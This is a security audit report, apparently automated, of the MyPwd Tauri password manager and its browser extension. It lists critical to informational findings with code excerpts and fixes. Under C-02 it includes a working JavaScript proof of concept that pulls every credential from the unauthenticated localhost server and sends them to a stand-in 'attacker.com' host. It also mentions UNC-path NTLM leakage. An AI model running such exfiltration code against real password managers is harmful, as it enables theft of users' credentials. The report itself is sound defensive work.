# MyPwd Security Review Report

**Date:** 2026-03-19
**Reviewer:** Security Architect (Automated Review)
**Scope:** Full codebase - Tauri 2 desktop app (React + Rust) with Chrome extension
**Commit:** 4bf1cae (feat: MyPwd password manager - initial release)

---

## Executive Summary

MyPwd is a Tauri 2-based desktop password manager with a browser extension for autofill. The application uses SQLCipher for encrypted storage, PBKDF2 for key derivation, and bcrypt for PIN hashing. Overall the cryptographic foundation is reasonable, but there are **2 Critical**, **4 High**, **3 Medium**, and **4 Low** severity findings, plus several informational notes.

The most severe issues are: (1) the master key being stored as a plaintext-equivalent base64 file on disk for PIN unlock, and (2) the local HTTP server exposing an unauthenticated API that returns cleartext passwords.

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 4 |
| Medium | 3 |
| Low | 4 |
| Info | 5 |

---

## Critical Findings

### C-01: Master Key Stored in Plaintext on Disk (PIN Unlock)

**OWASP:** A02 Cryptographic Failures
**File:** `src-tauri/src/lib.rs` lines 209-213
**Severity:** CRITICAL

When a user sets up a PIN, the raw master key is base64-encoded and written to `mypwd.key` on disk:

```rust
let key_b64 = base64::engine::general_purpose::STANDARD.encode(master_key);
let key_path = db_path.with_extension("key");
std::fs::write(&key_path, &key_b64)
```

This completely undermines the SQLCipher encryption. Any process or malware running as the same Windows user can read this file and decrypt the entire database. The PIN only protects against UI-level access; the actual encryption key sits unprotected on the filesystem.

**Impact:** Total compromise of all stored passwords if an attacker has filesystem read access (which is trivial on a shared or compromised machine).

**Remediation:**
- Encrypt the master key using DPAPI (`CryptProtectData`) before writing to disk. DPAPI ties decryption to the current Windows user session.
- Alternatively, derive a wrapping key from the PIN (using a separate KDF with its own salt) and use AES-GCM to encrypt the master key before storage.
- Never write the raw master key to disk.

---

### C-02: Unauthenticated Local HTTP Server Exposes Passwords

**OWASP:** A01 Broken Access Control, A07 Authentication Failures
**File:** `src-tauri/src/server.rs` lines 72-249
**Severity:** CRITICAL

The application starts an HTTP server on `127.0.0.1:27183` with CORS `allow_any_origin()`. This server:
- Has no authentication mechanism whatsoever.
- The `/autofill` endpoint returns cleartext `username` and `password` for any credential by ID.
- The `/search` endpoint returns credential summaries including usernames for any URL.
- Any local process, any browser tab (CORS is `allow_any_origin`), or any malicious website opened in the browser can query this endpoint.

```rust
fn cors_headers() -> warp::cors::Builder {
    warp::cors()
        .allow_any_origin()  // Any website can make requests
        .allow_methods(vec!["GET", "POST", "OPTIONS"])
        .allow_headers(vec!["Content-Type"])
}
```

An attacker can trivially exfiltrate all passwords with:
```javascript
// From any website while MyPwd is unlocked:
fetch('http://127.0.0.1:27183/search', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({url: '%'})  // match all
}).then(r => r.json()).then(data => {
  data.credentials.forEach(c => {
    fetch('http://127.0.0.1:27183/autofill', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({id: c.id})
    }).then(r => r.json()).then(cred => {
      // cred.username and cred.password now exfiltrated
      fetch('https://attacker.com/steal?u=' + cred.username + '&p=' + cred.password);
    });
  });
});
```

**Impact:** Complete exfiltration of all stored credentials from any website visited while MyPwd is unlocked.

**Remediation:**
- Implement a shared secret / token-based authentication. Generate a random token at startup, store it in the extension's native messaging or local storage (not accessible to web pages), and require it as a Bearer token or custom header on every request.
- Restrict CORS to only the extension's origin (`chrome-extension://<id>`) instead of `allow_any_origin`.
- Consider using Chrome's Native Messaging API instead of a localhost HTTP server, which provides a secure IPC channel that web pages cannot access.
- At minimum, restrict CORS to reject requests from web origins (only allow extension origins).

---

## High Findings

### H-01: Derived Key Used Directly as Both Encryption Key and Verification Hash

**OWASP:** A02 Cryptographic Failures
**File:** `src-tauri/src/lib.rs` lines 31-53, `src-tauri/src/crypto/master.rs` lines 30-34
**Severity:** HIGH

The same PBKDF2-derived key serves dual purposes:
1. It is used as the SQLCipher database encryption key.
2. It is stored (base64-encoded) in the `settings` table as `master_hash` for password verification.

```rust
let key = master::derive_key(&password, &salt);
// Used as encryption key:
let conn = vault::open(&db_path, &key)?;
// Same key stored as hash:
let hash_b64 = base64::engine::general_purpose::STANDARD.encode(&key);
conn.execute("INSERT OR REPLACE INTO settings (key, value) VALUES ('master_hash', ?1)", [&hash_b64])
```

This means the encryption key is stored inside the database it encrypts. While the database is encrypted, anyone who can derive the key (e.g., brute force) gets both verification confirmation and the encryption key simultaneously, and the key is stored redundantly.

**Impact:** Violates the principle of separating verification material from encryption keys. If the master_hash is ever leaked (e.g., through backup or memory dump), the database is directly compromised.

**Remediation:**
- Derive two separate keys from the master password: one for encryption (the SQLCipher key) and one for verification (store a hash of this second key, or use a separate PBKDF2 derivation with different salt/info).
- Example: use HKDF to derive separate subkeys from the PBKDF2 output for different purposes.

---

### H-02: Content Security Policy Disabled

**OWASP:** A05 Security Misconfiguration
**File:** `src-tauri/tauri.conf.json` line 24
**Severity:** HIGH

The CSP is explicitly set to `null`, which disables all Content Security Policy protections:

```json
"security": {
    "csp": null
}
```

In a Tauri application, this allows the webview to load scripts from any origin, execute inline scripts, and connect to arbitrary URLs. While Tauri apps typically load local content, disabling CSP removes an important defense-in-depth layer.

**Impact:** If any XSS vulnerability exists (e.g., through imported credential data rendered unsafely), attackers can execute arbitrary JavaScript in the webview context with access to the `invoke()` API, which can call any Tauri command including reading all credentials.

**Remediation:**
```json
"security": {
    "csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src http://127.0.0.1:27183"
}
```

---

### H-03: No Brute-Force Protection on Master Password or PIN

**OWASP:** A07 Identification and Authentication Failures
**File:** `src-tauri/src/lib.rs` (unlock_with_password, unlock_with_pin)
**Severity:** HIGH

There is no rate limiting, account lockout, or progressive delay on failed authentication attempts. An attacker with physical or remote access can attempt unlimited master password or PIN guesses.

For PINs (4-6 digits), this is especially dangerous: a 4-digit PIN has only 10,000 possibilities and can be brute-forced in seconds through the Tauri IPC.

**Impact:** The PIN authentication (4-6 digits) can be brute-forced trivially. Master password brute-forcing is slowed by PBKDF2 (600,000 iterations) but has no additional protection.

**Remediation:**
- Implement an exponential backoff or lockout after N failed attempts (e.g., 5 attempts, then 30-second delay, doubling each time).
- After 10+ failed PIN attempts, require master password authentication.
- Log failed authentication attempts.

---

### H-04: Salt Stored in Unprotected Sidecar File

**OWASP:** A02 Cryptographic Failures
**File:** `src-tauri/src/lib.rs` lines 56-58
**Severity:** HIGH

The PBKDF2 salt is written to `mypwd.salt` as a plaintext base64 file alongside the database. Combined with the `mypwd.key` file (C-01), an attacker gains the salt, the master key, and the PIN hash -- everything needed to unlock the database without the user's password.

The salt must be accessible before the database is opened (chicken-and-egg problem with SQLCipher), but storing it unprotected alongside the key file creates a complete key-material package on disk.

**Impact:** Reduces the security to that of the filesystem ACLs. Any local read access yields full compromise.

**Remediation:**
- The salt alone being stored externally is an acceptable design tradeoff (it is public in many schemes). However, combined with C-01 (plaintext key file), the overall posture is critically weak.
- Consider embedding the salt in the first bytes of the database file header (before SQLCipher encryption begins) or using a fixed derivation from a machine-specific identifier.

---

## Medium Findings

### M-01: `open_folder` Command Injection Risk

**OWASP:** A03 Injection
**File:** `src-tauri/src/lib.rs` lines 331-340
**Severity:** MEDIUM

The `open_folder` command passes a user-supplied string directly to `explorer.exe`:

```rust
fn open_folder(path: String) -> Result<(), String> {
    std::process::Command::new("explorer")
        .arg(&path)
        .spawn()
        .map_err(|e| e.to_string())?;
}
```

While `Command::new("explorer").arg()` uses proper argument separation (not shell execution), `explorer.exe` interprets certain paths specially. More critically, any frontend code can call this command with an arbitrary path.

**Impact:** Could potentially be used to open UNC paths (`\\attacker\share`), triggering NTLM hash leakage.

**Remediation:**
- Validate that the path is a local directory (not a UNC path, not a URL).
- Canonicalize the path and verify it exists as a directory before opening.

---

### M-02: Clipboard Data Not Auto-Cleared

**OWASP:** A04 Insecure Design
**File:** `src/hooks/useCredentials.ts` lines 108-119
**Severity:** MEDIUM

Passwords copied to the clipboard remain indefinitely:

```typescript
const copyToClipboard = useCallback(async (text: string) => {
    await navigator.clipboard.writeText(text);
    // No timeout to clear clipboard
}, []);
```

Clipboard contents are accessible to all applications on the system and persist until overwritten.

**Impact:** Copied passwords remain in clipboard memory, accessible to clipboard-monitoring malware or other applications.

**Remediation:**
- Implement a clipboard timeout (e.g., 30 seconds) that clears the clipboard after copying:
```typescript
setTimeout(async () => {
    const current = await navigator.clipboard.readText();
    if (current === text) {
        await navigator.clipboard.writeText('');
    }
}, 30000);
```

---

### M-03: `import_from_browser` Accepts Arbitrary File Paths

**OWASP:** A01 Broken Access Control
**File:** `src-tauri/src/import/mod.rs` lines 46-49
**Severity:** MEDIUM

The `import_from_browser` command accepts any file path string from the frontend without validation:

```rust
pub fn import_from_browser(profile_path: String) -> Result<Vec<ImportedCredential>, String> {
    let path = std::path::Path::new(&profile_path);
    chromium_direct::read_chromium_passwords(path)
}
```

Although the function currently returns an error (stub), when implemented it would read arbitrary SQLite databases from any path. Additionally, the `profile_path` exposed by `detect_browsers` reveals local filesystem structure to the webview.

**Impact:** When implemented, could be used for arbitrary file reads if not properly constrained.

**Remediation:**
- Validate that the path is within known browser profile directories.
- Use the detected browser paths from `detect_browsers` as an allowlist.

---

## Low Findings

### L-01: derive_key Returns Vec<u8> Without Zeroization Guarantee

**OWASP:** A02 Cryptographic Failures
**File:** `src-tauri/src/crypto/master.rs` line 14
**Severity:** LOW

The `derive_key` function returns a `Vec<u8>`, which has no automatic zeroization. While `verify_master_password` explicitly zeroizes its derived key, callers of `derive_key` in `lib.rs` store the key in `AppState` and only zeroize on `lock_app`. The key material may remain in freed memory.

```rust
pub fn derive_key(password: &str, salt: &[u8]) -> Vec<u8> {
    let mut key = vec![0u8; KEY_LENGTH];
    // ...
    key  // No Zeroize on drop
}
```

**Impact:** Key material may persist in deallocated memory, potentially recoverable through memory forensics.

**Remediation:**
- Use `zeroize::Zeroizing<Vec<u8>>` as the return type, which automatically zeroizes on drop.
- Apply `#[derive(Zeroize, ZeroizeOnDrop)]` to any struct holding key material.

---

### L-02: Password Passed as `String` Through Tauri IPC

**OWASP:** A02 Cryptographic Failures
**File:** `src-tauri/src/lib.rs` lines 29, 71, 114, 194
**Severity:** LOW

Master passwords and PINs are received as `String` in Tauri commands. Rust `String` values are not zeroized on drop and may be copied or moved in memory by the allocator.

```rust
fn setup_master_password(state: tauri::State<'_, AppState>, password: String) -> Result<(), String> {
```

**Impact:** Password strings may persist in process memory after the function returns.

**Remediation:**
- Convert to `Zeroizing<String>` immediately upon receipt.
- Note: This is a limitation of the Tauri IPC layer and cannot be fully mitigated without framework changes.

---

### L-03: `update_setting` Allows Arbitrary Key-Value Writes

**OWASP:** A01 Broken Access Control
**File:** `src-tauri/src/lib.rs` lines 251-268
**Severity:** LOW

The `update_setting` command accepts any key-value pair, including security-sensitive keys like `master_hash`, `salt`, or `pin_enabled`. A compromised frontend could overwrite these values.

**Impact:** If combined with an XSS vulnerability, an attacker could modify security settings.

**Remediation:**
- Validate the `key` parameter against an allowlist of permitted settings.
- Prevent modification of security-critical keys (`master_hash`, `salt`, `pin_enabled`) through this generic endpoint.

---

### L-04: Backup File Path Not Validated

**OWASP:** A01 Broken Access Control
**File:** `src-tauri/src/backup/mod.rs` lines 147-151, 206-210
**Severity:** LOW

The `create_backup_cmd` and `restore_backup_cmd` commands accept arbitrary file paths from the frontend. While Tauri's dialog plugin is used in the UI, the commands themselves accept any path.

**Impact:** Could be used to write/read files at arbitrary locations if the frontend is compromised.

**Remediation:**
- Validate that backup paths are within acceptable directories (e.g., user documents, app data).

---

## Informational Findings

### I-01: PBKDF2 Iteration Count

**File:** `src-tauri/src/crypto/master.rs` line 7

The iteration count of 600,000 is reasonable for 2026 but below the OWASP recommendation of 600,000 for PBKDF2-HMAC-SHA256 (they actually now recommend 600k, so this is aligned). For enhanced security, consider migrating to Argon2id which provides better resistance to GPU/ASIC attacks.

### I-02: No Audit Logging

**OWASP:** A09 Security Logging and Monitoring Failures

There is no logging of security-relevant events: failed login attempts, credential access, backup operations, or settings changes. This makes forensic analysis impossible.

### I-03: Auto-Lock Granularity

**File:** `src/App.tsx` lines 41-46

The auto-lock interval (5 minutes) is hardcoded and checked every 30 seconds. The actual lock delay can be up to 5 minutes 30 seconds. Consider making this configurable and reducing the check interval.

### I-04: Extension Content Script on All URLs

**File:** `extension/manifest.json` line 10

The content script runs on `<all_urls>`, injecting DOM elements into every page. This maximizes the attack surface. Consider using declarative content scripts that activate only when login forms are detected.

### I-05: Database File Permissions

The application does not explicitly set restrictive file permissions on `mypwd.db`, `mypwd.salt`, `mypwd.key`, or `mypwd.pin`. On Windows, files inherit parent directory ACLs, which typically allow read access to the user account. In a multi-user or shared computer scenario, these files should have explicit restrictive ACLs.

---

## Dependency Assessment

### Rust Dependencies (Cargo.toml)

| Dependency | Version | Assessment |
|-----------|---------|------------|
| rusqlite (bundled-sqlcipher) | 0.31 | Good - bundles SQLCipher for encryption at rest |
| aes-gcm | 0.10 | Good - RustCrypto implementation, well-audited |
| pbkdf2 | 0.12 | Good - RustCrypto, standard implementation |
| bcrypt | 0.15 | Acceptable for PIN hashing |
| zeroize | 1.7 | Good - but underutilized (see L-01) |
| warp | 0.3 | Concern - used for the unauthenticated HTTP server (C-02) |
| rand (OsRng) | 0.8 | Good - uses OS CSPRNG |

### Frontend Dependencies (package.json)

| Dependency | Version | Assessment |
|-----------|---------|------------|
| react | 19.1.0 | Good - auto-escapes by default (XSS protection) |
| @tauri-apps/api | ^2 | Good - current |
| vite | ^7.0.4 | Good - current |

No known CVEs in the declared dependencies at time of review. The dependency set is minimal, which reduces attack surface.

---

## Architecture Risk Summary

```
Threat Model:
+-------------------+        +-------------------+       +------------------+
|   Browser Ext.    | --HTTP--> |  Warp Server     | <---> |   SQLCipher DB   |
|  (content.js)     |  :27183  |  (NO AUTH!) [C02] |       |                  |
+-------------------+        +-------------------+       +------------------+
                                      ^
                                      |
+-------------------+                 |
| ANY website/app   | --HTTP----------+  (CORS: allow_any_origin!)
| on localhost       |
+-------------------+

Filesystem:
    mypwd.db    - Encrypted (SQLCipher) - OK
    mypwd.salt  - Plaintext             - Acceptable alone
    mypwd.key   - BASE64 MASTER KEY     - CRITICAL [C01]
    mypwd.pin   - bcrypt hash           - OK
```

---

## Prioritized Remediation Plan

### Immediate (Before Any Distribution)

1. **[C-02]** Add authentication to the local HTTP server and restrict CORS. Consider native messaging.
2. **[C-01]** Encrypt the master key with DPAPI before writing to disk, or derive a wrapping key from the PIN.

### Before Release

3. **[H-01]** Separate encryption key from verification hash using HKDF.
4. **[H-02]** Enable a restrictive Content Security Policy.
5. **[H-03]** Add brute-force protection (rate limiting / lockout) for PIN and master password.

### Next Sprint

6. **[M-02]** Auto-clear clipboard after 30 seconds.
7. **[M-01]** Validate paths in `open_folder` against UNC/URL injection.
8. **[M-03]** Validate `import_from_browser` paths against an allowlist.

### Backlog

9. **[L-01, L-02]** Improve zeroization of key material and password strings.
10. **[L-03]** Add allowlist to `update_setting`.
11. **[I-02]** Implement security audit logging.
12. **[I-04]** Restrict extension content script activation.

---

## Conclusion

The MyPwd password manager has a solid cryptographic foundation (SQLCipher, PBKDF2, AES-GCM, bcrypt) and good Rust-side practices (parameterized queries, no SQL injection). However, the two critical findings -- plaintext master key on disk and unauthenticated localhost API -- effectively nullify the database encryption for any local attacker or malicious website. These must be addressed before the application can be considered secure for real-world use.

The frontend uses React's built-in XSS protections correctly and the Tauri IPC boundary provides reasonable isolation. The primary risks are at the system boundary layer (filesystem storage and network API).
